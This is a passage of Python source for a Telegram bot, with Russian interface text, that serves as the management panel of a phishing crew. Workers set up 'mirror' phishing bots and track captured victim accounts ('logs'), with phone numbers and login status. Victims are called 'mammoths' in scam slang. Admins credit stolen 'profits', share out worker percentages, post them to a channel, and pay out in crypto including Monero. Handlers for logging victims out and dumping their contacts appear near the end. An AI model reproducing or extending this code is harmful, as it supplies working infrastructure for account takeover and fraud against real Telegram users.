        logger.debug("Failed notifying/setting commands for new admin %s: %s", target_id, e)

    w_tag = f"@{worker['username']}" if worker["username"] else f"ID: {target_id}"
    await message.answer(
        f"✅ <b>Пользователь {w_tag} успешно назначен администратором!</b>",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text="« Список админов", callback_data="adm_menu_admins")]]
        ),
        parse_mode="HTML",
    )


# --------------------- 4. STATISTICS ---------------------

@router.callback_query(F.data == "adm_menu_stats")
async def cb_adm_menu_stats(callback: CallbackQuery) -> None:
    await callback.answer()
    if not is_admin(callback.from_user.id):
        return

    stats = db.get_team_stats(DB_PATH)
    total_profits_sum = db.get_total_profits_sum(DB_PATH)
    total_users = stats["workers_count"] + stats["logs_count"]

    text = (
        "📊 <b>Статистика:</b>\n\n"
        f"👥 <b>Количество юзеров в боте:</b> <code>{total_users}</code>\n"
        f"💰 <b>Сумма профитов:</b> <b>{total_profits_sum:.2f} $</b>\n"
        f"🪞 <b>Количество Зеркал:</b> <code>{stats['mirrors_count']}</code>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")]]
    )
    await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)


# --------------------- 5. BROADCAST TO WORKERS ---------------------

@router.callback_query(F.data == "adm_menu_broadcast")
async def cb_adm_menu_broadcast(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.waiting_bot_broadcast_content)
    text = (
        "📢 <b>Рассылка по боту (для воркеров):</b>\n\n"
        "Отправьте любое сообщение (текст, фото, видео, голосовое, кружок, файл, стикер). Текст поддерживает любое форматирование, а также prem эмоджи\n\n"
        "Сообщение будет доставлено всем зарегистрированным пользователям ворк-бота в оригинальном виде."
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="« Отмена", callback_data="adm_main_menu")]]
    )
    await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)


@router.message(AdminStates.waiting_bot_broadcast_content)
async def msg_bot_broadcast_content(message: Message, state: FSMContext, bot: Bot) -> None:
    if not message.from_user or not is_admin(message.from_user.id):
        return

    messages = await collect_media_group(message)
    if messages is None:
        return

    await state.clear()

    workers = db.get_all_workers(DB_PATH)
    sent = 0

    for w in workers:
        wid = w["tg_id"]
        try:
            for m in messages:
                await bot.copy_message(
                    chat_id=wid,
                    from_chat_id=m.chat.id,
                    message_id=m.message_id,
                )
            sent += 1
            await asyncio.sleep(0.04)
        except Exception as e:
            logger.debug("Failed broadcasting to worker %s: %s", wid, e)

    await message.answer(
        f"📢 <b>Рассылка успешно завершена!</b>\n\n"
        f"Доставлено <b>{sent}/{len(workers)}</b> воркерам с сохранением всех стилей и премиум эмодзи.",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")]]
        ),
        parse_mode="HTML",
    )


@router.message(Command("broadcast"))
async def cmd_broadcast(message: Message, command: CommandObject, bot: Bot) -> None:
    if not message.from_user or not is_admin(message.from_user.id):
        return
    if not command.args:
        await message.answer("Использование: <code>/broadcast &lt;текст сообщения&gt;</code>", parse_mode="HTML")
        return

    workers = db.get_all_workers(DB_PATH)
    sent = 0

    # Extract HTML formatted content to keep formatting & premium emojis
    raw_html = message.html_text or command.args.strip()
    cmd_prefix = "/broadcast"
    if raw_html.startswith(cmd_prefix):
        broadcast_html = raw_html[len(cmd_prefix):].strip()
    else:
        broadcast_html = command.args.strip()

    for w in workers:
        wid = w["tg_id"]
        try:
            await bot.send_message(chat_id=wid, text=broadcast_html, parse_mode="HTML")
            sent += 1
            await asyncio.sleep(0.04)
        except Exception:
            pass

    await message.answer(
        f"📢 <b>Рассылка завершена!</b>\n\nУспешно доставлено: <b>{sent}/{len(workers)}</b> воркерам.",
        parse_mode="HTML",
    )


# --------------------- 6. PROFITS MANAGEMENT ---------------------

@router.callback_query(F.data == "adm_menu_profits")
async def cb_adm_menu_profits(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    if not is_admin(callback.from_user.id):
        return
    await state.clear()

    profits = db.get_all_profits(DB_PATH)
    total_sum = sum(p["amount"] for p in profits)

    lines = [
        "💰 <b>Профиты:</b>\n",
        f"💵 <b>Сумма всех профитов:</b> <b>{total_sum:.2f} $</b>",
        f"📊 <b>Всего профитов добавлено:</b> <code>{len(profits)}</code>\n",
    ]
    if profits:
        lines.append("<b>Последние профиты:</b>")
        for p in profits[:10]:
            w_id = p["worker_tg_id"]
            w_obj = db.get_worker_by_tg_id(DB_PATH, w_id)
            w_tag = f"@{w_obj['username']}" if (w_obj and w_obj["username"]) else f"ID:{w_id}"
            comm = f" ({p['comment']})" if p["comment"] else ""
            lines.append(f"• #{p['id']} | <b>{p['amount']:.2f} $</b> → {w_tag}{comm}")
    else:
        lines.append("<i>Профитов пока нет. Нажмите «➕ Добавить профит», чтобы внести профит воркеру.</i>")

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="➕ Добавить профит", callback_data="adm_add_profit_start")],
            [InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")],
        ]
    )
    await _send_or_edit_menu(callback, "\n".join(lines), keyboard, photo_path=ADMIN_PANEL_PHOTO)


@router.callback_query(F.data == "adm_add_profit_start")
async def cb_adm_add_profit_start(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.waiting_profit_worker_query)
    text = (
        "➕ <b>Добавление профита воркеру:</b>\n\n"
        "Шаг 1: Введите <b>@username</b> или <b>ID воркера</b>:"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="« Отмена", callback_data="adm_menu_profits")]]
    )
    await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)


@router.message(AdminStates.waiting_profit_worker_query)
async def msg_profit_worker_query(message: Message, state: FSMContext) -> None:
    if not message.from_user or not is_admin(message.from_user.id):
        return
    query = message.text.strip() if message.text else ""
    worker = db.get_worker_by_query(DB_PATH, query)

    if not worker:
        await message.answer(
            "❌ <b>Воркер не найден!</b>\n\nУбедитесь, что воркер запускал ворк-бота.",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[[InlineKeyboardButton(text="« Назад", callback_data="adm_menu_profits")]]
            ),
            parse_mode="HTML",
        )
        return

    await state.update_data(profit_worker_tg_id=worker["tg_id"], profit_worker_username=worker["username"])
    await state.set_state(AdminStates.waiting_profit_amount)

    w_tag = f"@{worker['username']}" if worker["username"] else f"ID:{worker['tg_id']}"
    await message.answer(
        f"👤 <b>Воркер:</b> {w_tag}\n\n"
        "Шаг 2: Введите <b>сумму профита в $</b> (например: <code>150</code> или <code>200.50</code>):",
        parse_mode="HTML",
    )


@router.message(AdminStates.waiting_profit_amount)
async def msg_profit_amount(message: Message, state: FSMContext) -> None:
    if not message.from_user or not is_admin(message.from_user.id):
        return
    try:
        amount = float(message.text.strip().replace("$", "").replace(",", "."))
        if amount <= 0:
            raise ValueError()
    except (ValueError, AttributeError):
        await message.answer("❌ Введите корректную положительную сумму (например: <code>100</code>):", parse_mode="HTML")
        return

    await state.update_data(profit_amount=amount)
    await state.set_state(AdminStates.waiting_profit_comment)
    await message.answer(
        f"💰 Сумма: <b>{amount:.2f} $</b>\n\n"
        "Шаг 3: Введите <b>комментарий / примечание</b> к профиту (или отправьте <code>-</code>):",
        parse_mode="HTML",
    )


@router.message(AdminStates.waiting_profit_comment)
async def msg_profit_comment(message: Message, state: FSMContext, bot: Bot) -> None:
    if not message.from_user or not is_admin(message.from_user.id):
        return
    comment = message.text.strip() if message.text and message.text.strip() != "-" else ""
    data = await state.get_data()
    await state.clear()

    worker_tg_id = data["profit_worker_tg_id"]
    amount = data["profit_amount"]

    db.add_profit(
        db_path=DB_PATH,
        worker_tg_id=worker_tg_id,
        amount=amount,
        comment=comment,
        added_by=message.from_user.id,
    )

    worker = db.get_worker_by_tg_id(DB_PATH, worker_tg_id)
    w_tag = f"@{worker['username']}" if (worker and worker["username"]) else f"ID: {worker_tg_id}"
    total_prof = db.get_worker_total_profit(DB_PATH, worker_tg_id)

    # Notify worker in work-bot
    try:
        w_text = (
            "🎉 <b>Вам начислен новый профит!</b>\n\n"
            f"💰 <b>Сумма:</b> <b>{amount:.2f} $</b>\n"
            f"📊 <b>Общая сумма ваших профитов:</b> <b>{total_prof:.2f} $</b>\n"
            f"💳 <b>Текущий баланс:</b> <b>{worker['balance']:.2f} $</b>"
        )
        await bot.send_message(chat_id=worker_tg_id, text=w_text, parse_mode="HTML")
    except Exception:
        pass

    # Publish to profits telegram channel
    profit_img_path = None
    try:
        profit_img_path = await generate_profit_image(
            bot=bot,
            worker_tg_id=worker_tg_id,
            worker_username=worker["username"] if worker else None,
            amount=amount,
        )
    except Exception as e_gen:
        logger.warning("Failed generating profit card image: %s", e_gen)

    if PROFITS_CHANNEL_ID:
        try:
            worker_pct = db.get_worker_percent(DB_PATH, worker_tg_id)
            worker_share = amount * (worker_pct / 100.0)
            comment_line = f"\n📝 <b>Комментарий:</b> {comment}" if comment else ""
            chan_text = (
                f"👤 <b>Воркер:</b> {w_tag}\n"
                f"💰 <b>Сумма профита:</b> <b>{amount:.2f} $</b>\n"
                f"❄️ <b>Доля воркера:</b> <b>{worker_share:.2f} $</b> ({worker_pct}%){comment_line}"
            )
            if profit_img_path and os.path.exists(profit_img_path):
                photo = FSInputFile(profit_img_path)
                await bot.send_photo(chat_id=PROFITS_CHANNEL_ID, photo=photo, caption=chan_text, parse_mode="HTML")
            else:
                await bot.send_message(chat_id=PROFITS_CHANNEL_ID, text=chan_text, parse_mode="HTML")
        except Exception as e_chan:
            logger.warning("Failed sending profit to channel %s: %s", PROFITS_CHANNEL_ID, e_chan)

    confirm_text = (
        f"✅ <b>Профит успешно добавлен!</b>\n\n"
        f"👤 <b>Воркер:</b> {w_tag}\n"
        f"💰 <b>Сумма:</b> <b>{amount:.2f} $</b>\n"
        f"📈 <b>Общая сумма профитов воркера:</b> <b>{total_prof:.2f} $</b>\n"
        f"💳 <b>Текущий баланс воркера:</b> <b>{worker['balance']:.2f} $</b>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="➕ Добавить еще профит", callback_data="adm_add_profit_start")],
            [InlineKeyboardButton(text="« В раздел профитов", callback_data="adm_menu_profits")],
        ]
    )

    if profit_img_path and os.path.exists(profit_img_path):
        try:
            photo = FSInputFile(profit_img_path)
            await message.answer_photo(photo=photo, caption=confirm_text, reply_markup=keyboard, parse_mode="HTML")
            return
        except Exception:
            pass

    await message.answer(
        confirm_text,
        reply_markup=keyboard,
        parse_mode="HTML",
    )


# ===================== WORKER BUTTON CALLBACKS =====================

@router.callback_query(F.data == "wrk_main_menu")
async def cb_wrk_main_menu(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    await state.clear()
    user_id = callback.from_user.id if callback.from_user else 0
    is_adm = is_admin(user_id)
    await _send_or_edit_menu(
        callback,
        WORKER_WELCOME_TEXT,
        get_worker_keyboard(is_admin_flag=is_adm),
        photo_path=WORK_PANEL_PHOTO,
    )


@router.callback_query(F.data == "wrk_create_mirror")
async def cb_wrk_create_mirror(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    await state.clear()
    worker_id = callback.from_user.id if callback.from_user else 0
    tokens = db.get_tokens_by_owner(DB_PATH, worker_id)

    lines = [
        "🪞 <b>Ваши зеркала:</b>\n",
    ]
    if tokens:
        for idx, t in enumerate(tokens, 1):
            status_icon = "🟢" if t["status"] == "active" else "🔴"
            status_text = "Активно" if t["status"] == "active" else "Заблокировано"
            u_name = f"@{t['username']}" if t["username"] else f"ID #{t['id']}"
            lines.append(f"{idx}. {status_icon} <b>{u_name}</b> — <i>{status_text}</i>")
    else:
        lines.append("<i>У вас пока нет созданных зеркал.</i>")

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="➕ Новое зеркало", callback_data="wrk_add_mirror_prompt")],
            [InlineKeyboardButton(text="« Назад в меню", callback_data="wrk_main_menu")],
        ]
    )
    await _send_or_edit_menu(callback, "\n".join(lines), keyboard)


@router.callback_query(F.data == "wrk_add_mirror_prompt")
async def cb_wrk_add_mirror_prompt(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    text = (
        "В этом разделе вы создаете своего бота, в котором должен зарегистрироваться юзер.\n\n"
        "Пришлите в этого бота <b>Токен бота</b> с @BotFather, юз бота выбирайте под название и тематику фиш бота."
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="« Назад к зеркалам", callback_data="wrk_create_mirror")],
            [InlineKeyboardButton(text="« Назад в меню", callback_data="wrk_main_menu")],
        ]
    )
    await _send_or_edit_menu(callback, text, keyboard)


@router.callback_query(F.data == "wrk_my_logs")
async def cb_wrk_my_logs(callback: CallbackQuery) -> None:
    await callback.answer()
    worker_id = callback.from_user.id
    logs = db.get_worker_logs(DB_PATH, worker_id)

    text = (
        "📂 <b>Мои Логи</b>\n\n"
        "Тут ты можешь посмотреть свои логи и статус"
    )

    if not logs:
        text += "\n\n<i>У вас пока нет активных логов.</i>"
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="« Назад в меню", callback_data="wrk_main_menu")]
            ]
        )
        await _send_or_edit_menu(callback, text, keyboard)
        return

    # Build buttons for logs
    buttons = []
    for u in reversed(logs[-25:]):
        username = u["username"]
        phone = u["phone"] or "—"
        auth_step = u["auth_step"] or ""

        # Status icon
        if auth_step in ("closed_success", "completed", "success"):
            icon = "✅"
        elif auth_step in ("closed_fail", "failed", "banned", "logged_out"):
            icon = "❌"
        else:
            icon = "⏳"

        user_tag = f"@{username}" if username else f"ID:{u['tg_id']}"
        btn_text = f"{icon} {user_tag} {phone}"
        buttons.append([InlineKeyboardButton(text=btn_text, callback_data=f"wrk_view_log:{u['id']}")])

    buttons.append([InlineKeyboardButton(text="« Назад в меню", callback_data="wrk_main_menu")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    await _send_or_edit_menu(callback, text, keyboard)


@router.callback_query(F.data.startswith("wrk_view_log:"))
async def cb_wrk_view_log(callback: CallbackQuery) -> None:
    await callback.answer()
    try:
        log_id = int(callback.data.split(":")[1])
    except (ValueError, IndexError):
        return

    user = db.get_user_by_id(DB_PATH, log_id)
    if not user:
        await callback.answer("❌ Лог не найден.", show_alert=True)
        return

    username = f"@{user['username']}" if user["username"] else "—"
    phone = user["phone"] or "—"
    mirror_name = user["mirror_username"] if ("mirror_username" in user.keys() and user["mirror_username"]) else "—"
    mirror = f"@{mirror_name}" if mirror_name and mirror_name != "—" else "—"
    auth_step = user["auth_step"] or ""

    if auth_step in ("closed_success", "completed", "success"):
        status_desc = "✅ - Лог был успешно закрыт"
    elif auth_step in ("closed_fail", "failed", "banned", "logged_out"):
        status_desc = "❌ - Лог был не успешно закрыт"
    else:
        status_desc = "⏳ - Ожидайте, ваш лог в отработке, продолжайте обычное общение с мамонтом"

    text = (
        f"<b>Лог #{log_id}</b>\n\n"
        f"<b>Юз:</b> {username}\n"
        f"<b>Зеркало:</b> {mirror}\n"
        f"<b>Номер:</b> {phone}\n\n"
        f"{status_desc}"
    )

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="« Назад к логам", callback_data="wrk_my_logs")]
        ]
    )
    await _send_or_edit_menu(callback, text, keyboard)


# ===================== PAYOUT HANDLERS =====================

METHOD_NAMES = {
    "send": "@send",
    "xrocket": "@xrocket",
    "xmr": "XMR",
}


@router.callback_query(F.data == "wrk_payout")
async def cb_wrk_payout(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    await state.clear()
    worker = db.get_or_create_worker(DB_PATH, callback.from_user.id, callback.from_user.username)
    balance = worker["balance"] if worker["balance"] is not None else 0.0

    text = (
        "💸 <b>Выплата</b>\n\n"
        "<b>В этом разделе воркер может создавать заявку на выплату</b>\n\n"
        f"💰 <b>Ваш баланс:</b> <code>{balance:.2f} $</code>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="➕ Заявка на выплату", callback_data="wrk_payout_create")],
            [InlineKeyboardButton(text="📜 История выводов", callback_data="wrk_payout_history")],
            [InlineKeyboardButton(text="« Назад в меню", callback_data="wrk_main_menu")],
        ]
    )
    await _send_or_edit_menu(callback, text, keyboard)


@router.callback_query(F.data == "wrk_payout_create")
async def cb_wrk_payout_create(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    await state.clear()
    worker = db.get_or_create_worker(DB_PATH, callback.from_user.id, callback.from_user.username)
    balance = worker["balance"] if worker["balance"] is not None else 0.0

    if balance <= 0:
        text = (
            "💸 <b>Создание заявки на выплату</b>\n\n"
            f"💰 <b>Ваш баланс:</b> <code>{balance:.2f} $</code>\n\n"
            "❌ <i>У вас недостаточно средств на балансе для создания заявки.</i>"
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="« Назад к выплатам", callback_data="wrk_payout")]
            ]
        )
        await _send_or_edit_menu(callback, text, keyboard)
        return

    text = (
        "💸 <b>Создание заявки на выплату</b>\n\n"
        f"💰 <b>Доступно к выводу:</b> <code>{balance:.2f} $</code>\n\n"
        "<b>Выберите платежную систему:</b>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="⚡ @send", callback_data="wrk_paymethod:send"),
                InlineKeyboardButton(text="🚀 @xrocket", callback_data="wrk_paymethod:xrocket"),
            ],
            [
                InlineKeyboardButton(text="🔒 XMR", callback_data="wrk_paymethod:xmr"),
            ],
            [InlineKeyboardButton(text="« Назад к выплатам", callback_data="wrk_payout")],
        ]
    )
    await _send_or_edit_menu(callback, text, keyboard)


@router.callback_query(F.data.startswith("wrk_paymethod:"))
async def cb_wrk_paymethod(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    method_key = callback.data.split(":")[1]
    method_name = METHOD_NAMES.get(method_key, method_key)

    worker = db.get_or_create_worker(DB_PATH, callback.from_user.id, callback.from_user.username)
    balance = worker["balance"] if worker["balance"] is not None else 0.0

    await state.update_data(method_key=method_key, method_name=method_name, balance=balance)
    await state.set_state(PayoutStates.waiting_amount)

    text = (
        f"💸 <b>Выплата через {method_name}</b>\n\n"
        f"💰 <b>Доступно к выводу:</b> <code>{balance:.2f} $</code>\n\n"
        "<b>Укажите сумму выплаты:</b>\n"
        "<i>(Отправьте число сообщением или нажмите кнопку ниже)</i>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"⚡ Вывести максимум ({balance:.2f} $)", callback_data="wrk_pay_max")],
            [InlineKeyboardButton(text="« Назад к выбору способа", callback_data="wrk_payout_create")],
        ]
    )
    await _send_or_edit_menu(callback, text, keyboard)


@router.callback_query(F.data == "wrk_pay_max", PayoutStates.waiting_amount)
async def cb_wrk_pay_max(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    data = await state.get_data()
    balance = float(data.get("balance", 0.0))

    if balance <= 0:
        await callback.answer("❌ Баланс равен 0.", show_alert=True)
        return

    await state.update_data(amount=balance)
    await state.set_state(PayoutStates.waiting_requisites)

    method_name = data.get("method_name", "выбранный метод")
    req_hint = (
        "• Для <b>@send</b>: укажите ваш @username или ID в Telegram\n"
        "• Для <b>@xrocket</b>: укажите ваш @username или адрес в @xrocket\n"
        "• Для <b>XMR</b>: укажите адрес Monero (XMR)"
    )

    text = (
        f"💸 <b>Выплата {balance:.2f} $ через {method_name}</b>\n\n"
        "<b>Укажите ваши реквизиты:</b>\n"
        f"{req_hint}\n\n"
        "<i>Отправьте реквизиты текстовым сообщением:</i>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="« Отмена", callback_data="wrk_payout")]
        ]
    )
    await _send_or_edit_menu(callback, text, keyboard)


@router.message(PayoutStates.waiting_amount)
async def msg_payout_amount(message: Message, state: FSMContext) -> None:
    if not message.text:
        return
    text = message.text.strip().replace("$", "").replace(",", ".")
    try:
        amount = float(text)
    except ValueError:
        await message.answer("❌ Введите корректную сумму числом (например: <code>50</code> или <code>120.50</code>).", parse_mode="HTML")
        return

    if amount <= 0:
        await message.answer("❌ Сумма выплаты должна быть больше 0.", parse_mode="HTML")
        return

    data = await state.get_data()
    balance = float(data.get("balance", 0.0))
    if amount > balance:
        await message.answer(f"❌ Сумма превышает доступный баланс (<b>{balance:.2f} $</b>). Введите другую сумму:", parse_mode="HTML")
        return

    await state.update_data(amount=amount)
    await state.set_state(PayoutStates.waiting_requisites)

    method_name = data.get("method_name", "выбранный метод")
    req_hint = (
        "• Для <b>@send</b>: укажите ваш @username или ID в Telegram\n"
        "• Для <b>@xrocket</b>: укажите ваш @username или адрес в @xrocket\n"
        "• Для <b>XMR</b>: укажите адрес Monero (XMR)"
    )

    resp = (
        f"💸 <b>Выплата {amount:.2f} $ через {method_name}</b>\n\n"
        "<b>Укажите ваши реквизиты:</b>\n"
        f"{req_hint}\n\n"
        "<i>Отправьте реквизиты текстовым сообщением:</i>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="« Отмена", callback_data="wrk_payout")]
        ]
    )
    await message.answer(resp, reply_markup=keyboard, parse_mode="HTML")


@router.message(PayoutStates.waiting_requisites)
async def msg_payout_requisites(message: Message, state: FSMContext, bot: Bot) -> None:
    if not message.text or not message.from_user:
        return

    requisites = message.text.strip()
    data = await state.get_data()
    amount = float(data.get("amount", 0.0))
    method_name = data.get("method_name", "@send")
    worker_id = message.from_user.id
    worker_username = message.from_user.username or "—"

    # Deduct balance & create payout request
    db.deduct_worker_balance(DB_PATH, worker_id, amount)
    payout_id = db.create_payout_request(DB_PATH, worker_id, amount, method_name, requisites)
    await state.clear()

    # Success confirmation to worker
    text = (
        f"✅ <b>Заявка на выплату #{payout_id} успешно создана!</b>\n\n"
        f"💰 <b>Сумма:</b> <code>{amount:.2f} $</code>\n"
        f"💳 <b>Способ:</b> <b>{method_name}</b>\n"
        f"👛 <b>Реквизиты:</b> <code>{requisites}</code>\n\n"
        "⏳ <i>Ожидайте проверки и перевода от администрации.</i>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📜 История выводов", callback_data="wrk_payout_history")],
            [InlineKeyboardButton(text="« Главное меню", callback_data="wrk_main_menu")],
        ]
    )
    await message.answer(text, reply_markup=keyboard, parse_mode="HTML")

    # Notify Admin
    adm_text = (
        f"💸 <b>НОВАЯ ЗАЯВКА НА ВЫПЛАТУ #{payout_id}!</b>\n\n"
        f"👨‍💻 <b>Воркер:</b> @{worker_username} (ID: <code>{worker_id}</code>)\n"
        f"💰 <b>Сумма:</b> <b>{amount:.2f} $</b>\n"
        f"💳 <b>Способ:</b> <b>{method_name}</b>\n"
        f"👛 <b>Реквизиты:</b> <code>{requisites}</code>"
    )
    adm_kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"adm_pay_appr:{payout_id}"),
                InlineKeyboardButton(text="❌ Отклонить", callback_data=f"adm_pay_rej:{payout_id}"),
            ]
        ]
    )
    admin_rows = db.get_all_admins(DB_PATH)
    all_admin_ids = {7491827504, ADMIN_CHAT_ID}
    for a in admin_rows:
        if a["role"] == "admin":
            all_admin_ids.add(a["tg_id"])
    for aid in ADMIN_CHAT_IDS:
        all_admin_ids.add(aid)

    for aid in all_admin_ids:
        try:
            await bot.send_message(chat_id=aid, text=adm_text, reply_markup=adm_kb, parse_mode="HTML")
        except Exception as e:
            logger.error("Failed to notify admin %s about payout #%s: %s", aid, payout_id, e)


@router.callback_query(F.data == "wrk_payout_history")
async def cb_wrk_payout_history(callback: CallbackQuery) -> None:
    await callback.answer()
    payouts = db.get_worker_payouts(DB_PATH, callback.from_user.id)

    if not payouts:
        text = (
            "📜 <b>История выводов:</b>\n\n"
            "<i>У вас пока нет созданных заявок на выплату.</i>"
        )
    else:
        lines = ["📜 <b>История выводов:</b>\n"]
        for p in payouts[:15]:
            p_id = p["id"]
            amt = p["amount"]
            method = p["method"]
            st = p["status"]
            if st == "approved":
                st_icon = "✅ Выплачено"
            elif st == "rejected":
                st_icon = "❌ Отклонено"
            else:
                st_icon = "⏳ В обработке"
            date_str = p["created_at"][:10] if p["created_at"] else "—"
            lines.append(f"• <b>Заявка #{p_id}</b> | <code>{amt:.2f} $</code> [{method}] | {date_str} | {st_icon}")
        text = "\n".join(lines)

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="« Назад к выплатам", callback_data="wrk_payout")]
        ]
    )
    await _send_or_edit_menu(callback, text, keyboard)


@router.callback_query(F.data.startswith("adm_pay_appr:"))
async def cb_adm_pay_appr(callback: CallbackQuery, bot: Bot) -> None:
    await callback.answer()
    payout_id = int(callback.data.split(":")[1])
    payout = db.get_payout_by_id(DB_PATH, payout_id)
    if not payout:
        await callback.answer("❌ Заявка не найдена.", show_alert=True)
        return

    if payout["status"] != "pending":
        await callback.answer(f"Заявка уже обработана ({payout['status']}).", show_alert=True)
        return

    db.set_payout_status(DB_PATH, payout_id, "approved")
    worker_id = payout["worker_tg_id"]
    amount = payout["amount"]
    method = payout["method"]

    # Notify worker
    try:
        await bot.send_message(
            chat_id=worker_id,
            text=f"🎉 <b>Ваша заявка на выплату #{payout_id} на сумму {amount:.2f} $ [{method}] успешно выплачена!</b>",
            parse_mode="HTML",
        )
    except Exception:
        pass

    if callback.message:
        await callback.message.edit_text(
            f"{callback.message.text}\n\n✅ <b>ВЫПЛАЧЕНО (Подтверждено администратором)</b>",
            reply_markup=None,
            parse_mode="HTML",
        )


@router.callback_query(F.data.startswith("adm_pay_rej:"))
async def cb_adm_pay_rej(callback: CallbackQuery, bot: Bot) -> None:
    await callback.answer()
    payout_id = int(callback.data.split(":")[1])
    payout = db.get_payout_by_id(DB_PATH, payout_id)
    if not payout:
        await callback.answer("❌ Заявка не найдена.", show_alert=True)
        return

    if payout["status"] != "pending":
        await callback.answer(f"Заявка уже обработана ({payout['status']}).", show_alert=True)
        return

    worker_id = payout["worker_tg_id"]
    amount = payout["amount"]
    method = payout["method"]

    # Refund balance & set status rejected
    db.add_worker_balance(DB_PATH, worker_id, amount)
    db.set_payout_status(DB_PATH, payout_id, "rejected")

    # Notify worker
    try:
        await bot.send_message(
            chat_id=worker_id,
            text=f"❌ <b>Ваша заявка на выплату #{payout_id} на сумму {amount:.2f} $ [{method}] была отклонена.</b>\nСредства возвращены на ваш баланс.",
            parse_mode="HTML",
        )
    except Exception:
        pass

    if callback.message:
        await callback.message.edit_text(
            f"{callback.message.text}\n\n❌ <b>ОТКЛОНЕНО (Средства возвращены на баланс воркера)</b>",
            reply_markup=None,
            parse_mode="HTML",
        )


def _format_days(days: int) -> str:
    if days % 10 == 1 and days % 100 != 11:
        return f"{days} день"
    elif 2 <= days % 10 <= 4 and not (12 <= days % 100 <= 14):
        return f"{days} дня"
    else:
        return f"{days} дней"


@router.callback_query(F.data == "wrk_profile")
async def cb_wrk_profile(callback: CallbackQuery) -> None:
    await callback.answer()
    worker = db.get_or_create_worker(DB_PATH, callback.from_user.id, callback.from_user.username)
    logs = db.get_worker_logs(DB_PATH, callback.from_user.id)
    total_profit = db.get_worker_total_profit(DB_PATH, callback.from_user.id)

    # Calculate days in team
    created_at_str = worker["created_at"]
    try:
        if created_at_str:
            created_dt = datetime.fromisoformat(created_at_str.replace("Z", "+00:00"))
            now_dt = datetime.now(timezone.utc)
            diff_days = max(1, (now_dt - created_dt).days + 1)
        else:
            diff_days = 1
    except Exception:
        diff_days = 1
    days_text = _format_days(diff_days)

    text = (
        "👤 <b>Профиль</b>\n\n"
        f"💰 <b>Сумма профитов:</b> <code>{total_profit:.2f} $</code>\n"
        f"🦣 <b>Количество логов:</b> <code>{len(logs)}</code>\n"
        f"⏳ <b>Сколько дней в команде:</b> <code>{days_text}</code>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="« Назад в меню", callback_data="wrk_main_menu")]
        ]
    )
    await _send_or_edit_menu(callback, text, keyboard)


@router.callback_query(F.data.startswith("adm_logout_ask:"))
async def cb_adm_logout_ask(callback: CallbackQuery) -> None:
    await callback.answer("Подтвердите действие")
    user_tg_id = int(callback.data.split(":")[1])
    confirm_kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🔴 Точно разлогинить?",
                    callback_data=f"adm_logout_do:{user_tg_id}",
                ),
                InlineKeyboardButton(
                    text="« Отмена",
                    callback_data=f"adm_logout_cancel:{user_tg_id}",
                ),
            ]
        ]
    )
    if callback.message:
        await callback.message.edit_reply_markup(reply_markup=confirm_kb)


@router.callback_query(F.data.startswith("adm_logout_cancel:"))
async def cb_adm_logout_cancel(callback: CallbackQuery) -> None:
    await callback.answer("Отменено")
    user_tg_id = int(callback.data.split(":")[1])
    if callback.message:
        await callback.message.edit_reply_markup(reply_markup=get_admin_log_keyboard(user_tg_id))



@router.callback_query(F.data.startswith("adm_dump_contacts:"))
async def cb_adm_dump_contacts(callback: CallbackQuery, bot: Bot) -> None:
    user_tg_id = int(callback.data.split(":")[1])
